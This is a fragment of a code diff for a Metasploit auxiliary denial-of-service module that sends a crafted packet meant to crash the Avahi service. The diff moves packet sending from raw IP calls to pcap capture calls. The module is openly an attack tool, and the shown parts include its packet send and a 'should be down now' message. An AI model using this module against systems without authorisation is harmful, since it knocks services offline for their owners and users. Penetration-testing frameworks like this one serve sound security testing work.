@@ -14,7 +14,7 @@ require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::Ip
+	include Msf::Exploit::Capture
 	include Msf::Auxiliary::Dos
 
 	def initialize
@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		print_status("Sending to #{rhost}")
 
-		connect_ip
+		open_pcap
 
 		n = Racket::Racket.new
 
@@ -55,9 +55,9 @@ class Metasploit3 < Msf::Auxiliary
 		n.l4.dst_port = datastore['RPORT'].to_i
 		pkt = n.pack
 
-		ip_write(pkt)
+		capture_sendto(pkt, rhost)
 
-		disconnect_ip
+		close_pcap
 
 		print_status("Avahi should be down now")
 	end
